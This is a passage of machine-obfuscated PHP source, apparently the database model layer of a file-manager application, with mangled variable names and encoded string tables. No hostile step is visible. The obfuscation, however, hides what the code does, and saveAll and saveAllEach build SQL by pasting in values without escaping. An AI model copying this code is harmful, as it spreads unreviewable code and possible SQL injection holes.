²ç³[444] => array($è€ ²ç³[445] => $ˆô™„Ä, $è€ ²ç³[441] => $ˆ²ìÇäÑ, $è€ ²ç³[430] => $â’‘Ëİ, $è€ ²ç³[446] => $—¢ò¶†â), $è€ ²ç³[447] => $ÊƒÔôò); return $ÑÍ»»™; } protected function checkLength($ ò€¿æÂ, $Ãíş•Ö§ = 0, $ïÖÂûãı = '') { $æ˜™¢é =& $_SERVER[Š—Â“œÔ]; $Ãíş•Ö§ = $Ãíş•Ö§ ? $Ãíş•Ö§ : 65536; if (!$ ò€¿æÂ || strlen($ ò€¿æÂ) < $Ãíş•Ö§) { return; } $ïÖÂûãı = $ïÖÂûãı ? $ïÖÂûãı . $æ˜™¢é[74] : $æ˜™¢é[12]; show_json($ïÖÂûãı . LNG($æ˜™¢é[448]) . "\50{$Ãíş•Ö§}\51", !1); } protected function metaSet($“—­Õ»‰, $•Ò£¿ = null, $¦‹ÔÕÑù = null) { $©çâ“Ñí =& $_SERVER[Š—Â“œÔ]; if (!$this->tableMeta || !$“—­Õ»‰) { return !1; } $Õ…öîÉ = $this->tableMeta[$©çâ“Ñí[449]]; $Á”ğ¸É = $this->tableMeta[$©çâ“Ñí[450]]; $Ùş¾üÜ  = Model($Á”ğ¸É); $ÈµÌÉ­¯ = array($Õ…öîÉ => $“—­Õ»‰, $©çâ“Ñí[451] => $•Ò£¿); if (is_null($•Ò£¿)) { return $Ùş¾üÜ ->where(array($Õ…öîÉ => $“—­Õ»‰))->delete(); } if (is_null($¦‹ÔÕÑù) && is_string($•Ò£¿)) { return $Ùş¾üÜ ->where($ÈµÌÉ­¯)->delete(); } $Õµ›—õò = is_array($•Ò£¿) ? $•Ò£¿ : array(); if (is_string($•Ò£¿)) { $Õµ›—õò[$•Ò£¿] = $¦‹ÔÕÑù; } $¾™ó‡·Æ = array(); foreach ($Õµ›—õò as $è¢¯Õ€¼ => $¹¿üİ™¼) { if (is_null($¹¿üİ™¼) && is_string($è¢¯Õ€¼)) { $Ùş¾üÜ ->where(array($Õ…öîÉ => $“—­Õ»‰, $©çâ“Ñí[451] => $è¢¯Õ€¼))->delete(); continue; } $this->checkLength($¹¿üİ™¼, !1, $Á”ğ¸É . $©çâ“Ñí[4] . $è¢¯Õ€¼); $¾™ó‡·Æ[] = array($Õ…öîÉ => $“—­Õ»‰, $©çâ“Ñí[97] => $è¢¯Õ€¼, $©çâ“Ñí[452] => $¹¿üİ™¼); } $ñ¢£ú¦ = $©çâ“Ñí[453] . $Á”ğ¸É; CacheLock::lock($ñ¢£ú¦); $Ùş¾üÜ ->where(array($Õ…öîÉ => $“—­Õ»‰))->addAll($¾™ó‡·Æ, array(), !0); CacheLock::unlock($ñ¢£ú¦); return !0; } public function metaGet($·†ş³, $Ç«É»äÉ = false) { $şÕçËıÏ =& $_SERVER[Š—Â“œÔ]; if (!$this->tableMeta) { return array(); } $ÀÓâô­– = $this->tableMeta[$şÕçËıÏ[449]]; $˜å“Ô‡ = Model($this->tableMeta[$şÕçËıÏ[450]]); if ($Ç«É»äÉ) { $€Šä²»Ô = array($ÀÓâô­– => $·†ş³, $şÕçËıÏ[97] => $Ç«É»äÉ); return $˜å“Ô‡->where($€Šä²»Ô)->getField($şÕçËıÏ[452]); } $€Šä²»Ô = array($ÀÓâô­– => $·†ş³); $¯ö‚Ü¶ï = $˜å“Ô‡->field($şÕçËıÏ[454])->where($€Šä²»Ô)->select(); $¯ö‚Ü¶ï = array_to_keyvalue($¯ö‚Ü¶ï, $şÕçËıÏ[97], $şÕçËıÏ[452]); return $¯ö‚Ü¶ï; } private function checkDataAutoHas($ñ”ğ·†‹) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ÅÙ²ì¥ù) { if (in_array($ñ”ğ·†‹, explode($_SERVER[Š—Â“œÔ][50], $ÅÙ²ì¥ù[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$µ‰Å×Û, $‘í¦Ğ£) { $¤­ŸÓ¸Ø =& $_SERVER[Š—Â“œÔ]; if (!is_array($µ‰Å×Û)) { return; } foreach ($this->dataAuto as $¦ßÉ¹ó) { $—ùõ„Äø = $¦ßÉ¹ó[0]; if (!in_array($‘í¦Ğ£, explode($¤­ŸÓ¸Ø[50], $¦ßÉ¹ó[2]))) { continue; } switch (trim($¦ßÉ¹ó[3])) { case $¤­ŸÓ¸Ø[398]: case $¤­ŸÓ¸Ø[399]: $ğ³¹Ï«å = $¦ßÉ¹ó[1]; $ëèÔ¶„ = isset($¦ßÉ¹ó[4]) ? (array) $¦ßÉ¹ó[4] : array(); if ($ğ³¹Ï«å == $¤­ŸÓ¸Ø[206] && array_key_exists($—ùõ„Äø, $µ‰Å×Û)) { if (!$µ‰Å×Û[$—ùõ„Äø]) { unset($µ‰Å×Û[$—ùõ„Äø]); } break; } if (isset($µ‰Å×Û[$—ùõ„Äø])) { array_unshift($ëèÔ¶„, $µ‰Å×Û[$—ùõ„Äø]); } if ($¤­ŸÓ¸Ø[398] == $¦ßÉ¹ó[3]) { $µ‰Å×Û[$—ùõ„Äø] = call_user_func_array($ğ³¹Ï«å, $ëèÔ¶„); } else { $µ‰Å×Û[$—ùõ„Äø] = call_user_func_array(array(&$this, $ğ³¹Ï«å), $ëèÔ¶„); } break; case $¤­ŸÓ¸Ø[349]: if (isset($µ‰Å×Û[$—ùõ„Äø]) && $µ‰Å×Û[$—ùõ„Äø]) { $µ‰Å×Û[$—ùõ„Äø] = call_user_func_array(array(&$this, $¦ßÉ¹ó[1]), array($µ‰Å×Û[$—ùõ„Äø])); } break; case $¤­ŸÓ¸Ø[352]: $µ‰Å×Û[$—ùõ„Äø] = $µ‰Å×Û[$¦ßÉ¹ó[1]]; break; case $¤­ŸÓ¸Ø[371]: if (isset($µ‰Å×Û[$—ùõ„Äø]) && !is_string($µ‰Å×Û[$—ùõ„Äø])) { $µ‰Å×Û[$—ùõ„Äø] = json_encode_force($µ‰Å×Û[$—ùõ„Äø]); } break; case $¤­ŸÓ¸Ø[400]: if ($µ‰Å×Û[$—ùõ„Äø] === $¤­ŸÓ¸Ø[12]) { unset($µ‰Å×Û[$—ùõ„Äø]); } break; case $¤­ŸÓ¸Ø[401]: $µ‰Å×Û[$—ùõ„Äø] = $¦ßÉ¹ó[1]; default: break; } } if ($‘í¦Ğ£ == $¤­ŸÓ¸Ø[432]) { $‚ÓÙ§Ğ» = strtolower($this->db->getDbType()); if (strpos($‚ÓÙ§Ğ», $¤­ŸÓ¸Ø[13]) !== 0) { return; } $ãàÈü‚ = $this->field(!0)->fields; $¿Ê¯ÑĞ = $ãàÈü‚[$¤­ŸÓ¸Ø[331]]; if (isset($ãàÈü‚[$¤­ŸÓ¸Ø[330]])) { unset($¿Ê¯ÑĞ[$ãàÈü‚[$¤­ŸÓ¸Ø[330]]]); } foreach ($¿Ê¯ÑĞ as $âØõğë => $‘í¦Ğ£) { if (!isset($µ‰Å×Û[$âØõğë])) { $µ‰Å×Û[$âØõğë] = $¤­ŸÓ¸Ø[12]; } } } } private function dataAfterFilter(&$»ö›äŸç) { $˜ÈŸ°Äµ =& $_SERVER[Š—Â“œÔ]; foreach ($this->dataAuto as $“ŞùİÁú) { $¼šÎÀ¶ı = $“ŞùİÁú[0]; if (!isset($»ö›äŸç[$¼šÎÀ¶ı])) { continue; } if (!in_array($˜ÈŸ°Äµ[434], explode($˜ÈŸ°Äµ[50], $“ŞùİÁú[2]))) { continue; } switch (trim($“ŞùİÁú[3])) { case $˜ÈŸ°Äµ[398]: case $˜ÈŸ°Äµ[399]: $º¢í‚Õ’ = isset($“ŞùİÁú[4]) ? (array) $“ŞùİÁú[4] : array(); array_unshift($º¢í‚Õ’, $»ö›äŸç[$¼šÎÀ¶ı]); if (isset($“ŞùİÁú[4]) && $“ŞùİÁú[4] == $˜ÈŸ°Äµ[455]) { $º¢í‚Õ’ = array($»ö›äŸç[$¼šÎÀ¶ı]); } if ($˜ÈŸ°Äµ[398] == $“ŞùİÁú[3]) { $»ö›äŸç[$¼šÎÀ¶ı] = call_user_func_array($“ŞùİÁú[1], $º¢í‚Õ’); } else { $»ö›äŸç[$¼šÎÀ¶ı] = call_user_func_array(array(&$this, $“ŞùİÁú[1]), $º¢í‚Õ’); } break; case $˜ÈŸ°Äµ[349]: if (isset($»ö›äŸç[$¼šÎÀ¶ı]) && $»ö›äŸç[$¼šÎÀ¶ı]) { $»ö›äŸç[$¼šÎÀ¶ı] = call_user_func_array(array(&$this, $“ŞùİÁú[1]), array($»ö›äŸç[$¼šÎÀ¶ı])); } break; case $˜ÈŸ°Äµ[352]: $»ö›äŸç[$¼šÎÀ¶ı] = $»ö›äŸç[$“ŞùİÁú[1]]; break; case $˜ÈŸ°Äµ[371]: $‹ËåıŠ• = $»ö›äŸç[$¼šÎÀ¶ı]; $»ö›äŸç[$¼šÎÀ¶ı] = json_decode($‹ËåıŠ•, !0); if (is_null($»ö›äŸç[$¼šÎÀ¶ı])) { $»ö›äŸç[$¼šÎÀ¶ı] = $‹ËåıŠ•; } break; case $˜ÈŸ°Äµ[400]: if ($»ö›äŸç[$¼šÎÀ¶ı] === $˜ÈŸ°Äµ[12]) { unset($»ö›äŸç[$¼šÎÀ¶ı]); } break; case $˜ÈŸ°Äµ[401]: $»ö›äŸç[$¼šÎÀ¶ı] = $“ŞùİÁú[1]; break; default: break; } } } public function saveAll($Æößúç±) { $øâñæñï =& $_SERVER[Š—Â“œÔ]; $€”›¥åÔ = $this->tablePrefix . $this->tableName; $˜‘ôÔ© = self::SQL_WHERE_IN_CHUNK; $Æößúç± = is_array($Æößúç±) ? $Æößúç± : array(); $ß†üÎ‰Ç = $øâñæñï[456]; $Ï÷ü‹¹ = 0; $×Ô¨”‹ = array(); $ºĞÕĞıÅ = count($Æößúç±); for ($şëÆ‚ò‰ = 0; $şëÆ‚ò‰ < $ºĞÕĞıÅ; $şëÆ‚ò‰++) { $—à—íñÑ = $Æößúç±[$şëÆ‚ò‰]; if (!is_array($—à—íñÑ) || count($—à—íñÑ) != 4) { continue; } $ïò…¾¤¿ = "\125\x50\104\x41\x54\105\40\140{$€”›¥åÔ}\x60\40\x53\105\x54\40{$—à—íñÑ[2]}\40\x3d\40\103\x41\x53\105\40{$—à—íñÑ[0]}\40\xa"; if ($Ï÷ü‹¹ == 0) { $ß†üÎ‰Ç = $ïò…¾¤¿; } $×Ô¨”‹[] = $øâñæñï[121] . $—à—íñÑ[1] . $øâñæñï[121]; $Ï÷ü‹¹++; $ß†üÎ‰Ç .= "\x20\127\x48\x45\116\40\x27{$—à—íñÑ[1]}\x27\x20\x54\110\105\x4e\40\47{$—à—íñÑ[3]}\47\x20\12"; if ($Ï÷ü‹¹ == $˜‘ôÔ© || $şëÆ‚ò‰ == $ºĞÕĞıÅ - 1) { $¨æ¨ç•’ = implode($øâñæñï[50], $×Ô¨”‹); $ß†üÎ‰Ç .= "\40\x45\116\104\x20\x20\x57\x48\x45\x52\x45\x20{$—à—íñÑ[0]}\x20\x49\116\40\50{$¨æ¨ç•’}\x29\x20"; $this->execute($ß†üÎ‰Ç); $Ï÷ü‹¹ = 0; $ß†üÎ‰Ç = $ïò…¾¤¿; $this->chunkEventCheck(count($×Ô¨”‹)); $×Ô¨”‹ = array(); } } $this->chunkEventSet(); } public function saveAllEach($ü¹­‹Êá) { $õàö”‡¶ =& $_SERVER[Š—Â“œÔ]; $¨¡·ˆË‡ = $this->tablePrefix . $this->tableName; foreach ($ü¹­‹Êá as $ËÅ´­û¸) { if (!is_array($ËÅ´­û¸) || count($ËÅ´­û¸) != 4) { continue; } $¾ÀóİÔ = $ËÅ´­û¸[0] . $õàö”‡¶[457] . $ËÅ´­û¸[1] . $õàö”‡¶[121]; $°˜¦§ó = $ËÅ´­û¸[2] . $õàö”‡¶[457] . $ËÅ´­û¸[3] . $õàö”‡¶[121]; $‘Ã´«Ãˆ = "\x75\160\x64\x61\164\x65\40{$¨¡·ˆË‡}\x20\x73\145\x74\40{$°˜¦§ó}\x20\x77\x68\x65\x72\145\x20{$¾ÀóİÔ}\x3b"; $this->execute($‘Ã´«Ãˆ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($¹¶Ş©öó = false, $åûñÇüÖ = false) { $this->_chunkEvent = $¹¶Ş©öó; $this->_chunkEventParam = $åûñÇüÖ; } private function chunkEventCheck($åĞ€ÂşÅ) { if (!$this->_chunkEvent) { return; } $¸¯Öş´¾ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $¸¯Öş´¾[$_SERVER[Š—Â“œÔ][458]] = $åĞ€ÂşÅ; Hook::trigger($this->_chunkEvent, $¸¯Öş´¾); } public function addAll($Òºó£ä, $˜‘ò Ç = array(), $ÊèÜ² = false) { $ª÷¢Ûêí =& $_SERVER[Š—Â“œÔ]; ignore_timeout(); $’ÖÜ”…Ù = self::SQL_WHERE_IN_CHUNK; if (empty($Òºó£ä)) { $this->error = think_lang($ª÷¢Ûêí[350]); return !1; } $˜‘ò Ç = $this->_parseOptions($˜‘ò Ç); foreach ($Òºó£ä as $Çôı Ã³ => $ØÍÚÚ´) { $Òºó£ä[$Çôı Ã³] = $this->_facade($ØÍÚÚ´); $this->_beforeInsert($Òºó£ä[$Çôı Ã³], $˜‘ò Ç); } if (method_exists($this->db, $ª÷¢Ûêí[351])) { for ($Õ¢ÌèñÒ = 0; $Õ¢ÌèñÒ < count($Òºó£ä); $Õ¢ÌèñÒ += $’ÖÜ”…Ù) { $üÖÂ¨ˆ” = array_slice($Òºó£ä, $Õ¢ÌèñÒ, $’ÖÜ”…Ù); if (!is_array($üÖÂ¨ˆ”) || count($üÖÂ¨ˆ”) == 0) { break; } $Ôâ¶ËÏ¶ = $this->db->insertAll($üÖÂ¨ˆ”, $˜‘ò Ç, $ÊèÜ²); $this->chunkEventCheck(count($üÖÂ¨ˆ”)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($Òºó£ä as $Çôı Ã³ => $ØÍÚÚ´) { $Ôâ¶ËÏ¶ = $this->db->insert($ØÍÚÚ´, $˜‘ò Ç, $ÊèÜ²); } $this->commit(); } if (!1 !== $Ôâ¶ËÏ¶) { $®ˆèÒ›« = $this->getLastInsID(); if ($®ˆèÒ›«) { return $®ˆèÒ›«; } } return $Ôâ¶ËÏ¶; } public function save($«°ª€ëì = '', $€îç„¬ = array()) { $¼‡„ÈØĞ =& $_SERVER[Š—Â“œÔ]; $àÁ¹Ë½ = self::SQL_WHERE_IN_CHUNK; $ÕÍ¸õÀÒ = $this->optionsValue(); $üÔâÜø‹ = $this->findWhereField($ÕÍ¸õÀÒ); if (!$üÔâÜø‹) { return parent::save($«°ª€ëì, $€îç„¬); } $È¦ˆ‚Õ = 0; $¡‰‰‰½² = $ÕÍ¸õÀÒ[$¼‡„ÈØĞ[354]][$üÔâÜø‹][1]; $¡‰‰‰½² = is_array($¡‰‰‰½²) ? $¡‰‰‰½² : array(); $‡Ş¤Õõ‰ = count($¡‰‰‰½²); for ($Ğ‘Ä¿´Â = 0; $Ğ‘Ä¿´Â < $‡Ş¤Õõ‰; $Ğ‘Ä¿´Â += $àÁ¹Ë½) { $Ÿ–Ùğ Â = array_slice($¡‰‰‰½², $Ğ‘Ä¿´Â, $àÁ¹Ë½); if (!is_array($Ÿ–Ùğ Â) || count($Ÿ–Ùğ Â) == 0) { break; } $ÕÍ¸õÀÒ[$¼‡„ÈØĞ[354]][$üÔâÜø‹][1] = $Ÿ–Ùğ Â; $this->optionsValue($ÕÍ¸õÀÒ); $È¦ˆ‚Õ += parent::save($«°ª€ëì, $€îç„¬); $this->chunkEventCheck(count($Ÿ–Ùğ Â)); } $this->chunkEventSet(); return $È¦ˆ‚Õ; } public function add($ó·½ª¨ö = '', $„ÊµìÃ¸ = array(), $ìÃ¬¬š = false) { if ($this->addTaskStatus && is_array($ó·½ª¨ö)) { $this->addTaskData[] = $ó·½ª¨ö; return; } return parent::add($ó·½ª¨ö, $„ÊµìÃ¸, $ìÃ¬¬š); } public function parseWhereLike($‚ãœè’á, $»ñÏ±›’ = '', $â¥¦úû = false, &$²‘›˜¹ = false) { $Š–—Ù©¿ =& $_SERVER[Š—Â“œÔ]; $‹Ú ƒ™Ê = $GLOBALS[$Š–—Ù©¿[6]][$Š–—Ù©¿[459]]; if (!$‹Ú ƒ™Ê[$Š–—Ù©¿[460]]) { return $‚ãœè’á; } if (!is_array($‚ãœè’á)) { return $‚ãœè’á; } $‰áÌ²× = array(); $øğ®¹ƒï = 0; foreach ($‚ãœè’á as $˜•’Ü°È => $—ßæçÓë) { if (is_array($—ßæçÓë) && count($—ßæçÓë) == 2 && $—ßæçÓë[0] == $Š–—Ù©¿[461] && is_string($—ßæçÓë[1]) && substr($—ßæçÓë[1], 0, 1) == $Š–—Ù©¿[462] && substr($—ßæçÓë[1], strlen($—ßæçÓë[1]) - 1, 1) == $Š–—Ù©¿[462]) { $²‘›˜¹ = !0; $­²¼âçˆ = is_string($˜•’Ü°È) ? $˜•’Ü°È : $»ñÏ±›’; $£­·ò™ê = substr($—ßæçÓë[1], 1, strlen($—ßæçÓë[1]) - 2); $£­·ò™ê = $this->db->escapeString($£­·ò™ê); if (!strpos($­²¼âçˆ, $Š–—Ù©¿[10])) { $­²¼âçˆ = $Š–—Ù©¿[463] . $­²¼âçˆ . $Š–—Ù©¿[463]; } $ùäÁ­­Â = $Š–—Ù©¿[222] . $£­·ò™ê . $Š–—Ù©¿[222]; $£­·ò™ê = str_replace(array($Š–—Ù©¿[10], $Š–—Ù©¿[464], $Š–—Ù©¿[11]), $Š–—Ù©¿[465], $£­·ò™ê); if ($‹Ú ƒ™Ê[$Š–—Ù©¿[466]]) { $ùäÁ­­Â = $Š–—Ù©¿[467] . $£­·ò™ê . $Š–—Ù©¿[468]; if ($‹Ú ƒ™Ê[$Š–—Ù©¿[469]]) { $ùäÁ­­Â = $Š–—Ù©¿[468] . $£­·ò™ê . $Š–—Ù©¿[467]; } } $‰áÌ²×[$øğ®¹ƒï] = $Š–—Ù©¿[470] . $­²¼âçˆ . $Š–—Ù©¿[471] . $ùäÁ­­Â . $Š–—Ù©¿[472]; $øğ®¹ƒï++; continue; } if (is_array($—ßæçÓë)) { $»ñÏ±›’ = is_string($˜•’Ü°È) ? $˜•’Ü°È : $»ñÏ±›’; $—ßæçÓë = $this->parseWhereLike($—ßæçÓë, $»ñÏ±›’, !0, $²‘›˜¹); } if (is_numeric($˜•’Ü°È)) { $‰áÌ²×[$øğ®¹ƒï] = $—ßæçÓë; $øğ®¹ƒï++; } else { $‰áÌ²×[$˜•’Ü°È] = $—ßæçÓë; } } if ($²‘›˜¹ && !$â¥¦úû) { } return $‰áÌ²×; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Îâ¯£ºœ = array()) { $«Ç„½ıÛ =& $_SERVER[Š—Â“œÔ]; $­‰ğ˜®Â = self::SQL_WHERE_IN_CHUNK; $ŠÅ¡ì—» = $this->optionsValue(); $ı¿¿†¹Ê = $this->findWhereField($ŠÅ¡ì—»); if (!$ı¿¿†¹Ê || isset($ŠÅ¡ì—»[$«Ç„½ıÛ[369]]) || isset($ŠÅ¡ì—»[$«Ç„½ıÛ[430]])) { return parent::select($Îâ¯£ºœ); } $©ê½¹õÛ = $ŠÅ¡ì—»[$«Ç„½ıÛ[354]][$ı¿¿†¹Ê][1]; $©ê½¹õÛ = is_array($©ê½¹õÛ) ? $©ê½¹õÛ : array(); $ş´ÉîêÄ = null; for ($¬ºìËı¦ = 0; $¬ºìËı¦ < count($©ê½¹õÛ); $¬ºìËı¦ += $­‰ğ˜®Â) { $ğŠéÑÄê = array_slice($©ê½¹õÛ, $¬ºìËı¦, $­‰ğ˜®Â); if (!is_array($ğŠéÑÄê) || count($ğŠéÑÄê) == 0) { break; } $ŠÅ¡ì—»[$«Ç„½ıÛ[354]][$ı¿¿†¹Ê][1] = $ğŠéÑÄê; $this->optionsValue($ŠÅ¡ì—»); $»ş…é¾â = parent::select($Îâ¯£ºœ); if (!$»ş…é¾â) { continue; } $ş´ÉîêÄ = is_array($ş´ÉîêÄ) ? $ş´ÉîêÄ : array(); $ş´ÉîêÄ = array_merge($ş´ÉîêÄ, $»ş…é¾â); } return $ş´ÉîêÄ; } public function delete($¯ñâŒ½ç = array()) { $¥£Æš’í =& $_SERVER[Š—Â“œÔ]; $Á×¨ƒÜ° = self::SQL_WHERE_IN_CHUNK; $ÓµË¾â© = $this->optionsValue(); $¨ĞÆ¿³ = $this->findWhereField($ÓµË¾â©); if (!$¨ĞÆ¿³) { return parent::delete($¯ñâŒ½ç); } $úØ†°¯¾ = 0; $á·Ñ¹ŠÂ = $ÓµË¾â©[$¥£Æš’í[354]][$¨ĞÆ¿³][1]; $á·Ñ¹ŠÂ = is_array($á·Ñ¹ŠÂ) ? $á·Ñ¹ŠÂ : array(); for ($éî¢Øö¬ = 0; $éî¢Øö¬ < count($á·Ñ¹ŠÂ); $éî¢Øö¬ += $Á×¨ƒÜ°) { $Ûóïñ„º = array_slice($á·Ñ¹ŠÂ, $éî¢Øö¬, $Á×¨ƒÜ°); if (!is_array($Ûóïñ„º) || count($Ûóïñ„º) == 0) { break; } $ÓµË¾â©[$¥£Æš’í[354]][$¨ĞÆ¿³][1] = $Ûóïñ„º; $this->optionsValue($ÓµË¾â©); $úØ†°¯¾ += parent::delete($¯ñâŒ½ç); } return $úØ†°¯¾; } private function findWhereField($¨  èš) { $…ì³Ñœ’ =& $_SERVER[Š—Â“œÔ]; $‘œş öÏ = self::SQL_WHERE_IN_CHUNK; if (!is_array($¨  èš) || !is_array($¨  èš[$…ì³Ñœ’[354]])) { return !1; } foreach ($¨  èš[$…ì³Ñœ’[354]] as $İä›´âÈ => $Â«ªÑì) { if (is_array($Â«ªÑì) && isset($Â«ªÑì[0]) && is_string($Â«ªÑì[0]) && strtolower($Â«ªÑì[0]) == $…ì³Ñœ’[7] && is_array($Â«ªÑì[1]) && count($Â«ªÑì[1]) > $‘œş öÏ) { ignore_timeout(); return $İä›´âÈ; } } return !1; } public function setMasterDB($çé´³Ïê = true) { think_config($_SERVER[Š—Â“œÔ][473], $çé´³Ïê); } } goto BòÎ¼â‘ó; b ¹Ş½³: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\x66\141\166"; protected function cacheFunctionAlias($€øéó–ó) { $ÄêÕ‰çÄ =& $_SERVER[Š—Â“œÔ]; return array($ÄêÕ‰çÄ[2086] => array($ÄêÕ‰çÄ[2509] . USER_ID, $ÄêÕ‰çÄ[2087])); } protected function listData() { $ã‰Ò‹‚Ó =& $_SERVER[Š—Â“œÔ]; $Ó¢åüƒç = array($ã‰Ò‹‚Ó[1761] => USER_ID, $ã‰Ò‹‚Ó[559] => array($ã‰Ò‹‚Ó[2090], 0)); $Áò«Ğİ = $ã‰Ò‹‚Ó[2510]; $ ïÔúè‚ = $this->field($Áò«Ğİ)->where($Ó¢åüƒç)->order($ã‰Ò‹‚Ó[2093])->select(); return $ ïÔúè‚ ? $ ïÔúè‚ : array(); } protected function addToTag($³½–¤áØ, $Ôºå­›™) { $¾Ã¹çÙ =& $_SERVER[Š—Â“œÔ]; if (!Model($¾Ã¹çÙ[2239])->listData($Ôºå­›™)) { return !1; } if (is_numeric($³½–¤áØ)) { $Ë·»» = Model($¾Ã¹çÙ[892])->pathInfo($³½–¤áØ); if (!$Ë·»») { return !1; } } else { $Ë·»» = IO::infoSimple($³½–¤áØ); if (!$Ë·»») { return !1; } $ƒ­ÒÖÙõ = $Ë·»»[$¾Ã¹çÙ[32]]; $ê°Ş¾¦ƒ = $Ë·»»[$¾Ã¹çÙ[33]]; if (isset($Ë·»»[$¾Ã¹çÙ[487]])) { $ê°Ş¾¦ƒ = $Ë·»»[$¾Ã¹çÙ[487]] == $¾Ã¹çÙ[91] ? $¾Ã¹çÙ[78] : $¾Ã¹çÙ[232]; } } $¥—ĞÎÏ = array($¾Ã¹çÙ[1761] => USER_ID, $¾Ã¹çÙ[559] => $Ôºå­›™, $¾Ã¹çÙ[497] => $³½–¤áØ, $¾Ã¹çÙ[498] => $ê°Ş¾¦ƒ ? $ê°Ş¾¦ƒ : $¾Ã¹çÙ[492], $¾Ã¹çÙ[496] => $ƒ­ÒÖÙõ ? $ƒ­ÒÖÙõ : $¾Ã¹çÙ[12], $¾Ã¹çÙ[1975] => 0); if ($this->where($¥—ĞÎÏ)->find()) { return !1; } return $this->add($¥—ĞÎÏ); } protected function removeFromTag($ù•òòúµ, $²å”Óæ€) { $³ø Š…Ñ =& $_SERVER[Š—Â“œÔ]; if (!Model($³ø Š…Ñ[2239])->listData($²å”Óæ€)) { return !1; } if (is_array($ù•òòúµ)) { $ù•òòúµ = array($³ø Š…Ñ[7], $ù•òòúµ); } $–àŸëäë = array($³ø Š…Ñ[1761] => USER_ID, $³ø Š…Ñ[559] => $²å”Óæ€, $³ø Š…Ñ[497] => $ù•òòúµ); return $this->where($–àŸëäë)->delete(); } protected function removeByTag($º®ù½ú) { $Å‘ó‡É× =& $_SERVER[Š—Â“œÔ]; if (!$º®ù½ú) { return !1; } $Ü¾´â«Å = array($Å‘ó‡É×[1761] => USER_ID, $Å‘ó‡É×[559] => $º®ù½ú); return $this->where($Ü¾´â«Å)->delete(); } protected function removeBySource($©‡ôšƒÑ) { $¥õŸÅÛ =& $_SERVER[Š—Â“œÔ]; if (is_array($©‡ôšƒÑ)) { $©‡ôšƒÑ = array($¥õŸÅÛ[7], $©‡ôšƒÑ); } $­×­Ûºé = array($¥õŸÅÛ[1761] => USER_ID, $¥õŸÅÛ[559] => array($¥õŸÅÛ[1088], 0), $¥õŸÅÛ[497] => $©‡ôšƒÑ); return $this->where($­×­Ûºé)->delete(); } }